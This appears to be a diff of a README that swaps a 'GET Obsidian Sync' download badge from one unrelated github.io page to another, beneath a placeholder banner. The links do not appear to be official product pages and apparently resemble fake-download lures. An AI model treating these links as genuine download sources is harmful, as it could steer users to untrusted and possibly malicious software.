@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=c59fdcf4a1fb229027c51cd4fbb3eb89297ce8ae-3716383-images-thumbs&n=13)
 
-[![GET Obsidian Sync](https://img.shields.io/badge/GET%20%E2%80%94%20Obsidian%20Sync-0078D6?style=for-the-badge&logoColor=white)](https://sector-level-disk-tools.github.io/.github/obsidian-sync-price)
+[![GET Obsidian Sync](https://img.shields.io/badge/GET%20%E2%80%94%20Obsidian%20Sync-0078D6?style=for-the-badge&logoColor=white)](https://damircontrerasikgm.github.io/.github/obsidian-sync-price)
 
 ---
 
